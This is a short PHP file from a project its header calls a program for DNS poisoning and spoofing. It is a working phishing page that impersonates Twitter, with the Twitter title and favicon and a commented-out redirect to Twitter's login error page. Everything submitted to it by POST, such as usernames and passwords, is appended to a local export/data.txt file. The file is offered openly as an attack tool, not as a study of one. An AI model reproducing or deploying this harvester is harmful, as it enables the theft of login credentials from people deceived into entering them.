<?php 

/*
*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
*  proxior is a program for poisoning and spoofing dns.
*
*  proxior is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  proxior is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
*/

$path = getcwd();

$path = substr($path,0,17);

$file = $path ."/export/data.txt";
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
file_put_contents($file, print_r("<hr/>\n", true), FILE_APPEND);

?>

<!-- <meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" /> -->


<html>
<head>

<meta charset="utf-8">

  <title>Twitter. It&#39;s what&#39;s happening.</title>      

<link href="https://ma.twimg.com/twitter-mobile/96e6f6ff1a9d3e3acf6b4ee4ce320dd1474e81c1/images/favicon.ico" rel="icon" type="image/x-icon" />


</head>
<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
</body>
</html>
